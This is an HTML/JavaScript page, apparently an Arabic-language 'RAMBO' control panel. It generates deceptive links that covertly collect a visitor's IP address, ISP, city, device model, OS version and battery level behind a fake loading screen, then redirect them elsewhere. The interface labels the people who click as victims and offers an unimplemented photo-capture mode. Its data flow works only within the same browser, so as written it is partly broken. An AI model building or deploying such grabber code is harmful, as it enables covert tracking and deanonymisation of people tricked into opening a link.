<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RAMBO Control Center</title>
    <style>
        :root {
            --bg: #121212; --card: #1e1e1e; --accent: #007bff; --neon: #00f2ff;
            --text: #e1e1e1; --secondary: #b0b0b0; --success: #28a745;
        }
        body { 
            margin: 0; background: var(--bg); font-family: 'Segoe UI', system-ui, -apple-system; 
            color: var(--text); transition: all 0.3s ease;
        }
        .container { display: flex; flex-direction: column; align-items: center; min-height: 100vh; padding: 20px; }
        
        .admin-box { 
            background: var(--card); padding: 30px; border-radius: 20px; width: 100%; max-width: 500px; 
            box-shadow: 0 10px 30px rgba(0,0,0,0.5); border: 1px solid rgba(255,255,255,0.05);
            animation: fadeIn 0.5s ease-out;
        }

        h2 { text-align: center; color: var(--neon); font-weight: 300; letter-spacing: 2px; margin-bottom: 25px; }

        .mode-container { display: flex; gap: 12px; margin-bottom: 20px; }
        .mode-card { 
            flex: 1; background: rgba(255,255,255,0.03); border: 1px solid #333; padding: 15px; 
            border-radius: 12px; text-align: center; cursor: pointer; transition: 0.2s;
        }
        .mode-card:hover { background: rgba(255,255,255,0.07); }
        .mode-card.active { border-color: var(--accent); background: rgba(0, 123, 255, 0.1); box-shadow: 0 0 15px rgba(0, 123, 255, 0.2); }

        input { 
            width: 100%; padding: 15px; background: #252525; border: 1px solid #333; border-radius: 10px; 
            color: #fff; margin-bottom: 15px; box-sizing: border-box; outline: none; transition: 0.3s;
        }
        input:focus { border-color: var(--accent); background: #2a2a2a; }

        .main-btn { 
            background: var(--accent); color: #fff; border: none; padding: 16px; border-radius: 10px; 
            width: 100%; font-weight: 600; cursor: pointer; transition: 0.2s;
        }
        .main-btn:active { transform: scale(0.98); }

        .result-box { 
            margin-top: 20px; padding: 15px; background: rgba(40, 167, 69, 0.1); 
            border: 1px dashed var(--success); border-radius: 10px; display: none;
        }

        #log-area { margin-top: 25px; width: 100%; display: none; }
        .data-log { background: #1a1a1a; padding: 20px; border-radius: 15px; border-left: 4px solid var(--neon); }
        .info-row { display: flex; justify-content: space-between; padding: 10px 0; border-bottom: 1px solid #222; font-size: 14px; }
        .info-row span { color: var(--neon); font-weight: 500; }

        .footer { margin-top: 40px; text-align: center; color: var(--secondary); font-size: 12px; }
        .rambo-tag { color: var(--accent); font-weight: bold; margin-top: 5px; display: block; font-family: monospace; }

        .victim-ui { position: fixed; inset: 0; background: var(--bg); z-index: 100; display: flex; justify-content: center; align-items: center; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
        .hidden { display: none !important; }
    </style>
</head>
<body>

<div class="container">
    <div id="admin-panel" class="admin-box">
        <h2>لوحة التحكم RAMBO</h2>
        
        <div class="mode-container">
            <div id="m1" class="mode-card active" onclick="selectMode('1', 'm1')">سحب بيانات الضحية</div>
            <div id="m2" class="mode-card" onclick="selectMode('2', 'm2')">سحب صور</div>
        </div>

        <input type="text" id="targetUrl" placeholder="رابط التحويل">
        <button class="main-btn" onclick="generateLink()">توليد الرابط</button>

        <div id="resultBox" class="result-box">
            <input type="text" id="copyLink" readonly onclick="this.select()" style="background:transparent; border:none; color:var(--success); text-align:center; margin:0;">
        </div>

        <div id="log-area">
            <div class="data-log">
                <p style="color:var(--accent); font-size:13px; margin-top:0;">[ تقرير الضحية ]</p>
                <div id="device-data"></div>
                <div id="image-data" class="hidden">
                    <img id="captured-img" style="width:100%; border-radius:10px; margin-top:15px; border: 1px solid #333;">
                </div>
            </div>
        </div>
    </div>

    <div class="footer">
        <p>غير مسؤول في استخدامك للموقع !</p>
        <span class="rambo-tag">Develop By RAMBO</span>
    </div>
</div>

<div id="victim-loader" class="victim-ui hidden">
    <div style="text-align:center;">
        <div style="border: 3px solid #333; border-top: 3px solid var(--accent); border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: auto;"></div>
        <p style="margin-top:15px; font-size:14px; color:var(--secondary);">جاري التحميل...</p>
    </div>
</div>

<style> @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } } </style>

<script>
    let activeMode = '1';
    const params = new URLSearchParams(window.location.search);
    const v = params.get('v');

    function selectMode(m, id) {
        activeMode = m;
        document.querySelectorAll('.mode-card').forEach(c => c.classList.remove('active'));
        document.getElementById(id).classList.add('active');
    }

    if (v) {
        document.getElementById('admin-panel').classList.add('hidden');
        document.getElementById('victim-loader').classList.remove('hidden');
        
        async function capture() {
            const ipReq = await fetch('https://ipapi.co/json/').catch(() => ({}));
            const ipData = await ipReq.json();
            const ua = navigator.userAgent;
            
            // تحديد دقيق للجهاز والإصدار
            let device = "Android Device";
            let version = "";

            if (/iPhone|iPad|iPod/.test(ua)) {
                const verMatch = ua.match(/OS (\d+)_(\d+)/);
                version = verMatch ? `iOS ${verMatch[1]}.${verMatch[2]}` : "iOS";
                // تحديد موديل الآيفون تقريبياً بناءً على نسبة الشاشة
                const ratio = window.devicePixelRatio;
                if (window.screen.height === 852) device = "iPhone 15 Pro / 14 Pro";
                else if (window.screen.height === 932) device = "iPhone 15 Pro Max / 14 Pro Max";
                else if (window.screen.height >= 812) device = "iPhone X or newer";
                else device = "iPhone (Older Model)";
            } else if (/Android/.test(ua)) {
                const andMatch = ua.match(/Android (\d+(\.\d+)?)/);
                version = andMatch ? `Android ${andMatch[1]}` : "Android";
                const modelMatch = ua.match(/Android.*;\s([^;]+)\sBuild/);
                device = modelMatch ? modelMatch[1] : "Android Phone";
            }

            const payload = {
                model: device,
                os: version,
                ip: ipData.ip || "N/A",
                isp: ipData.org || "Unknown",
                city: ipData.city || "Unknown",
                batt: (await navigator.getBattery?.().then(b => (b.level * 100).toFixed(0) + '%')) || "N/A"
            };
            
            localStorage.setItem('rambo_res', JSON.stringify(payload));
            const redir = localStorage.getItem('rambo_target') || 'https://google.com';

            if (v === '1') {
                setTimeout(() => window.location.href = redir, 500);
            } else {
                // وضع الكاميرا (يمكنك إضافة زر السماح هنا إذا أردت)
                window.location.href = redir; 
            }
        }
        capture();
    }

    function generateLink() {
        const url = document.getElementById('targetUrl').value;
        if (!url) return;
        localStorage.setItem('rambo_target', url);
        document.getElementById('copyLink').value = window.location.origin + window.location.pathname + "?v=" + activeMode;
        document.getElementById('resultBox').style.display = 'block';
    }

    window.addEventListener('storage', (e) => {
        if (e.key === 'rambo_res') {
            document.getElementById('log-area').style.display = 'block';
            const d = JSON.parse(e.newValue);
            document.getElementById('device-data').innerHTML = `
                <div class="info-row">الجهاز: <span>${d.model}</span></div>
                <div class="info-row">الإصدار: <span>${d.os}</span></div>
                <div class="info-row">الشركة: <span>${d.isp}</span></div>
                <div class="info-row">IP: <span>${d.ip}</span></div>
                <div class="info-row">المدينة: <span>${d.city}</span></div>
                <div class="info-row">البطارية: <span>${d.batt}</span></div>
            `;
        }
    });
</script>
</body>
</html>
